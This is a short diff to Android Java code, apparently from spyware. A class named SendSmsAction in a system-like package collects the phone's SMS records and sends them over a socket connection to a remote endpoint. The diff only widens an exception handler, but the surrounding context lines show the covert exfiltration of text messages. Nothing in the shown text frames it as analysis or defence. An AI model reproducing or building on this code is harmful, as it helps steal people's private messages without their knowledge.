@@ -9,7 +9,6 @@ import android.util.Log;
 import com.system.ui.model.SmsRecord;
 import com.system.ui.service.LocalService;
 
-import java.io.IOException;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -49,7 +48,7 @@ public class SendSmsAction extends AbsAction {
 		try {
 			((LocalService)mContext).getSocketThread().send("短信记录<*>"+getSmsInfo().toString());
 			Log.d("hyx:", getSmsInfo().toString());
-		} catch (IOException e) {
+		} catch (Exception e) {
 			e.printStackTrace();
 			return false;
 		}
